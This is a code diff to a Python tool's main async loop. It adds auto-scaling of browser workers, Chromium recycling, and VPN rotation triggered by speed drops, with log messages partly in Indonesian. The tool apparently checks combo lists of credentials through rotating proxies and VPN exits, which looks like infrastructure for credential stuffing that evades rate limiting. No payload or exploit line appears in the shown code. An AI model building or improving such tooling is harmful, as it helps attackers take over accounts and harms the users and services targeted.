@@ -5222,7 +5610,9 @@ async def async_main():
         stats['total'] = len(queue)
         stats['start'] = time.time()
         _PERF.reset()
-        stats['workers_total'] = stats['workers'] = min(NUM_CONTEXTS, len(queue))
+        _PERF.configure_workers(min_w=min(2, spawn_w), start_w=start_w, max_w=spawn_w, auto_scale=True)
+        stats['workers_total'] = spawn_w
+        stats['workers'] = _PERF.target_workers
         stats['proxy_label'] = f"{os.path.basename(PROXY_FILE)} ({len(live_pool or [])} live)" if PROXY_ENABLED else vpn_coord.label()
         _TUI_ACTIVE = bool(_IS_TTY and (_TERM != 'dumb') and _COLOR_OK)
         if _TUI_ACTIVE:
@@ -5238,21 +5628,39 @@ async def async_main():
                     continue
                 if vpn_coord is not None and (vpn_coord.ovpn_failed or vpn_coord.rotating):
                     continue
-                heal, h_tag, h_cur, h_peak = _PERF.should_auto_heal()
-                if not heal:
+                avail_mb = _detect_vps_hw().get('avail_mb', 0.0) if (auto_workers or hw_info) else 0.0
+                can_rot = vpn_coord is not None and (len(vpn_coord.ovpn_files) > 1 or bool(vpn_coord.vpn_cmd))
+                ctx_age = stats['proxy_ctx'] - browser_state['born_ctx']
+                act, info = _PERF.decide_action(avail_mb, can_rot, ctx_age, browser_state['recycling'])
+                if act == 'NONE':
                     continue
-                _PERF.last_heal_t = time.monotonic()
-                _PERF.drop_since_t = 0.0
-                if h_tag == 'LOCK' and not browser_state['recycling']:
+                _PERF.last_action_t = time.monotonic()
+                if act in ('SCALE_DOWN', 'SCALE_UP'):
+                    new_w = int(info.get('new_w', _PERF.target_workers))
+                    old_w = _PERF.target_workers
+                    why = info.get('reason', f"{info.get('cur_r', 0.0):.1f}/s")
+                    tag_n = f"{new_w}/{_PERF.max_workers}w {'-' if act == 'SCALE_DOWN' else '+'}"
+                    await _PERF.set_target_workers(new_w, tag_n)
+                    msg = f"SMART {old_w}->{new_w}w ({why})"
+                    _LIVE_LOGS.append(f" {c(CYAN if act == 'SCALE_UP' else GOLD)}*{W}  {c(CYAN if act == 'SCALE_UP' else GOLD)}{msg[:54]}{W}")
+                    if not _TUI_ACTIVE:
+                        p_out(f"  {c(CYAN)}[SMART] {msg}{W}")
+                elif act == 'RECYCLE_BROWSER':
+                    _PERF.last_heal_t = time.monotonic()
+                    _PERF.drop_since_t = 0.0
+                    _PERF.pause_until_t = time.monotonic() + 28.0
+                    h_cur, h_peak = info.get('cur_r', 0.0), info.get('peak_r', 0.0)
                     _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART HEAL: recycle browser ({h_cur:.2f} vs {h_peak:.2f}/s){W}")
                     if not _TUI_ACTIVE:
-                        p_out(f"  {c(GOLD)}[SMART] Speed drop ({h_cur:.2f} vs {h_peak:.2f}/s, {h_tag}) -> recycle Chromium...{W}")
+                        p_out(f"  {c(GOLD)}[SMART] {info.get('reason', 'LOCK')} -> recycle Chromium...{W}")
                     browser_state['born_ctx'] = stats['proxy_ctx'] - max(120, NUM_CONTEXTS * 15)
-                    _PERF.pause_until_t = time.monotonic() + 20.0
-                elif vpn_coord is not None and (len(vpn_coord.ovpn_files) > 1 or vpn_coord.vpn_cmd):
-                    _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART HEAL: {h_cur:.2f} vs {h_peak:.2f}/s ({h_tag}) -> rotasi VPN{W}")
+                elif act == 'ROTATE_VPN' and can_rot:
+                    _PERF.last_heal_t = time.monotonic()
+                    _PERF.drop_since_t = 0.0
+                    h_tag = info.get('tag', 'SLOW')
+                    _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART VPN: {info.get('reason', h_tag)} -> rotasi VPN{W}")
                     if not _TUI_ACTIVE:
-                        p_out(f"  {c(GOLD)}[SMART] Speed drop ({h_cur:.2f} vs {h_peak:.2f}/s, {h_tag}) -> rotasi VPN...{W}")
+                        p_out(f"  {c(GOLD)}[SMART] {info.get('reason', h_tag)} -> rotasi VPN...{W}")
                     try:
                         await vpn_coord.coordinate(f"slow:{h_tag.lower()}", vpn_coord.epoch, browser_state, stats)
                     except RuntimeError:
@@ -5293,7 +5701,7 @@ async def async_main():
                         fail_count = 0  # reset counter after sustained healthy work
                     fail_count += 1
                     if fail_count > MAX_CONSECUTIVE_FAILS:
-                        stats['workers'] = max(0, stats['workers'] - 1)
+                        _PERF.mark_worker_dead(wid)
                         if not _TUI_ACTIVE:
                             p_out(f"{c(RED)}[!] w{wid} crash {MAX_CONSECUTIVE_FAILS}x berturut-turut, dihentikan: {e}{W}")
                         else:
@@ -5317,11 +5725,16 @@ async def async_main():
                 checked_before = stats['checked']
                 wave_limit = checked_before + WAVE_REFRESH_EVERY
                 num_workers = min(NUM_CONTEXTS, max(1, combo_q.pending))
-                stats['workers'] = num_workers
+                if num_workers < _PERF.max_workers:
+                    _PERF.max_workers = num_workers
+                    _PERF.min_workers = min(_PERF.min_workers, num_workers)
+                    _PERF.target_workers = min(_PERF.target_workers, num_workers)
+                if wave_idx > 0:
+                    _PERF.dead_workers.clear()
+                    _PERF.resume()
+                stats['workers'] = min(_PERF.live_workers(), num_workers)
                 stats['workers_total'] = num_workers
                 stats['status'] = 'RUNNING'
-                if wave_idx > 0:
-                    _PERF.resume()
                 render_dashboard(force=True)
 
                 tasks = []
